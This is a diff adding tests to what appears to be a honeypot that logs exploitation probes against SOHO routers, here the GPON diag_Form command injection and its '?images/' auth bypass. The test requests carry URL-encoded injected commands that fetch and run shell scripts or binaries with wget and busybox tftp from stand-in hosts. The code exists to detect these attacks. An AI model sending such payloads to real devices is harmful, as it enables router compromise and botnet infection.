@@ -16625,6 +16625,8 @@ def test_soho_router_default_paths_match_observed_probes():
         "/cgi-bin/login.cgi",
         "/web/cgi-bin/hi3510/login.cgi",
         "/cgi-bin/luci/",
+        "/GponForm/diag_Form",
+        "/gponform/diag_form",  # case-insensitive
     ):
         assert tbenv.is_soho_router_path(path), f"expected match: {path}"
 
@@ -16647,6 +16649,14 @@ def test_soho_router_path_non_match():
         "/cgi-bin/",
         "/thruk/cgi-bin/login.cgi",    # monitoring app, not a router
         "/boaform",
+        # Not this firmware's vocabulary — these must keep falling through
+        # to the generic config / tarpit traps rather than being retagged
+        # as appliance exploitation.
+        "/GponForm",
+        "/GponForm/",
+        "/GponForm/.env",
+        "/GponForm/diag_Form/.env",
+        "/GponForm/nope_Form",
     ):
         assert not tbenv.is_soho_router_path(path), f"unexpected match: {path}"
 
@@ -16901,6 +16911,95 @@ async def test_soho_router_clean_request_logs_no_payload_fields(flux_client):
     assert last["sohoRouterHasCmdInjection"] is False
     assert "sohoRouterPayloadUrls" not in last
     assert "sohoRouterDownloaders" not in last
+
+
+async def test_gpon_diag_form_injection_in_body_logged(flux_client):
+    """The GPON diagnostic form is the CVE-2018-10562 injection sink.
+
+    Its operand field is `dest_host`, not the BOA form's `target_addr`,
+    and the published chain chains a fetch and a run in the one field.
+    """
+    resp = await flux_client.post(
+        "/GponForm/diag_Form",
+        data=(
+            "XWebPageName=diag&diag_action=ping&wan_conlist=0"
+            "&dest_host=%3Bwget+http%3A%2F%2F198.51.100.7%2Fb.sh+-O+%2Ftmp%2Fb%3B"
+            "sh+%2Ftmp%2Fb%3B&ipv=0"
+        ),
+        headers={"Content-Type": "application/x-www-form-urlencoded"},
+    )
+    assert resp.status == 200
+    last = _log_entries(flux_client.log_path)[-1]
+    assert last["result"] == "soho-router-diag"
+    assert last["sohoRouterHasCmdInjection"] is True
+    assert last["sohoRouterPayloadUrls"] == ["http://198.51.100.7/b.sh"]
+    assert "wget" in last["sohoRouterDownloaders"]
+
+
+async def test_gpon_diag_form_auth_bypass_marker_is_answered(flux_client):
+    """`?images/` is CVE-2018-10561's bypass. Loaders vary on sending it,
+    and the POST body is the only attacker-authored content in the
+    sequence — so the marker must never be a precondition for answering."""
+    resp = await flux_client.post(
+        "/GponForm/diag_Form?images/",
+        data="XWebPageName=diag&dest_host=%3Bbusybox+tftp+-g+-r+a+192.0.2.44%3B",
+        headers={"Content-Type": "application/x-www-form-urlencoded"},
+    )
+    assert resp.status == 200
+    last = _log_entries(flux_client.log_path)[-1]
+    assert last["sohoRouterHasCmdInjection"] is True
+    assert "tftp" in last["sohoRouterDownloaders"]
+
+
+async def test_gpon_diag_form_query_injection_with_bypass_marker(flux_client):
+    """The shape seen in the wild: the bypass marker and the injected
+    operand both ride the query string of a single GET."""
+    resp = await flux_client.get(
+        "/GponForm/diag_Form?images/&dest_host=%3Bwget+http%3A%2F%2F"
+        "203.0.113.9%2Farm7+-O+%2Ftmp%2Fa%3Bchmod+777+%2Ftmp%2Fa%3B"
+    )
+    assert resp.status == 200
+    last = _log_entries(flux_client.log_path)[-1]
+    assert last["result"] == "soho-router-diag"
+    assert last["sohoRouterHasCmdInjection"] is True
+    assert last["sohoRouterPayloadUrls"] == ["http://203.0.113.9/arm7"]
+    assert "wget" in last["sohoRouterDownloaders"]
+
+
+async def test_gpon_diag_form_clean_probe_separates_from_injection(flux_client):
+    resp = await flux_client.post(
+        "/GponForm/diag_Form",
+        data="XWebPageName=diag&diag_action=ping&dest_host=192.0.2.1&ipv=0",
+        headers={"Content-Type": "application/x-www-form-urlencoded"},
+    )
+    assert resp.status == 200
+    last = _log_entries(flux_client.log_path)[-1]
+    assert last["sohoRouterHasCmdInjection"] is False
+    assert "sohoRouterPayloadUrls" not in last
+
+
+async def test_soho_router_diag_back_link_names_the_requested_form(flux_client):
+    """The diagnostic page used to cite the BOA ping form whatever was
+    requested, so any other firmware's handler was answered with a page
+    naming a form it does not have."""
+    resp = await flux_client.get("/GponForm/diag_Form")
+    assert resp.status == 200
+    body = await resp.text()
+    assert "/GponForm/diag_Form" in body
+    assert "/boaform/admin/formPing" not in body
+
+    resp = await flux_client.get("/boaform/admin/formPing")
+    body = await resp.text()
+    assert "/boaform/admin/formPing" in body
+
+
+async def test_soho_router_diag_back_link_is_escaped(flux_client):
+    """The requested path reaches the response body, so it must be
+    HTML-escaped — a reflected path is otherwise an injection point."""
+    resp = await flux_client.get("/boaform/admin/formPing")
+    assert resp.status == 200
+    body = await resp.text()
+    assert "<script" not in body.lower()
 
 
 async def test_hnap1_soapaction_dropper_url_logged(flux_client):
